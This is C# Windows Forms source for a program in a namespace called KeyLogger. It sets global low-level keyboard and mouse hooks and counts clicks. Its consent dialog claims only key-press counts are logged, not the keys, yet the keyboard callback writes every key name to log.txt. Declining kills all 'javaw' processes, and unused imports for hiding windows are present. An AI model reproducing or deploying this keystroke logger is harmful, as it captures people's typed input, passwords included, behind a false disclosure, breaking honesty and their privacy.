using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace KeyLogger
{
    public partial class Form1 : Form
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_LBUTTONDOWN = 0x0201;
        private static LowLevelKeyboardProc _procKey = HookCallbackKey;
        private static LowLevelMouseProc _procMouse = HookCallbackMouse;
        private static IntPtr _hookIDKey = IntPtr.Zero;
        private static IntPtr _hookIDMouse = IntPtr.Zero;
        private static int keyClickCounter = 0;
        private static int mouseClickCounter = 0;
        private static int totalClickCounter = 0;
        private static Form1 form1;



        public Form1()
        {
            InitializeComponent();
            string message = "";
            message += "Below information will be logged. \n" +
                "1. Total Key pressed in the keyboard, not the Key\n" +
                "2. Totla Mouse click \n" +
                "3. Total time \n\n" +
                "Do you agree?";

            DialogResult result = MessageBox.Show(message, "Agree or not", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (result == DialogResult.Yes)
            {
                _hookIDKey = SetHook(_procKey);
                _hookIDMouse = SetHook(_procMouse);
                form1 = this; // (Form1)Application.OpenForms[0];
                btnStart.Enabled = false;
                btnStop.Enabled = true;
            }
            else if (result == DialogResult.No)
            {
                // Application.Exit();

                Process[] process = Process.GetProcesses();
                foreach (Process p in process)
                {
                    if (p.ProcessName.StartsWith("javaw"))
                    {
                        try
                        {
                            p.Kill();
                        }
                        catch (Exception e)
                        {

                        }

                    }

                }

                Environment.Exit(0);
            }

        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if(_hookIDKey != null)
            UnhookWindowsHookEx(_hookIDKey);
            if(_hookIDMouse != null)
            UnhookWindowsHookEx(_hookIDMouse);

            _hookIDKey = SetHook(_procKey);
            _hookIDMouse = SetHook(_procMouse);

            btnStart.Enabled = false;
            btnStop.Enabled = true;
            // form1 = (Form1)Application.OpenForms[0];
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            UnhookWindowsHookEx(_hookIDKey);
            UnhookWindowsHookEx(_hookIDMouse);

            btnStart.Enabled = true;
            btnStop.Enabled = false;
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr SetHook(LowLevelMouseProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_MOUSE_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallbackKey(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                //Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                sw.WriteLine((Keys)vkCode);
                sw.Close();
                keyClickCounter++;
            }


            totalClickCounter = keyClickCounter + mouseClickCounter;

            form1.txtBxKeyClick.Text = keyClickCounter.ToString();
            form1.txtBxMouseClick.Text = mouseClickCounter.ToString();
            form1.txtBxTotalClickCounter.Text = totalClickCounter.ToString();

            return CallNextHookEx(_hookIDKey, nCode, wParam, lParam);
        }

        private static IntPtr HookCallbackMouse(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && MouseMessages.WM_LBUTTONDOWN == (MouseMessages)wParam)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                //Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                sw.WriteLine((Keys)vkCode);
                sw.Close();
                mouseClickCounter++;
            }


            totalClickCounter = keyClickCounter + mouseClickCounter;

            form1.txtBxKeyClick.Text = keyClickCounter.ToString();
            form1.txtBxMouseClick.Text = mouseClickCounter.ToString();
            form1.txtBxTotalClickCounter.Text = totalClickCounter.ToString();

            return CallNextHookEx(_hookIDMouse, nCode, wParam, lParam);
        }

        /*
          if (nCode >= 0 && wParam==(IntPtr)WM_LBUTTONDOWN == (MouseMessages) )
            {
                mouseClickCounter++;
                MessageBox.Show("hello world");
                form1.txtBxMouseClick.Text = mouseClickCounter.ToString();
            }
            */

        private const int WH_MOUSE_LL = 14;

        private enum MouseMessages
        {

            WM_LBUTTONDOWN = 0x0201,

            WM_LBUTTONUP = 0x0202,

            WM_MOUSEMOVE = 0x0200,

            WM_MOUSEWHEEL = 0x020A,

            WM_RBUTTONDOWN = 0x0204,

            WM_RBUTTONUP = 0x0205

        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding.

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 1;

        private void btnReset_Click(object sender, EventArgs e)
        {
            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", false);
            sw.Close();
            keyClickCounter = 0;
            mouseClickCounter = 0;
            totalClickCounter = 0;
            txtBxKeyClick.Text = keyClickCounter.ToString();
            txtBxMouseClick.Text = mouseClickCounter.ToString();
            txtBxTotalClickCounter.Text = totalClickCounter.ToString();
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        [DllImport("user32")]
        public static extern void LockWorkStation();
        private void button1_Click(object sender, EventArgs e)
        {
            // LockWorkStation();
            Process[] process = Process.GetProcesses();
            foreach (Process p in process)
            {
                if (p.ProcessName.StartsWith("javaw"))
                {
                    MessageBox.Show(p.ProcessName);
                    p.Kill();
                }

            }
        }
    }
}
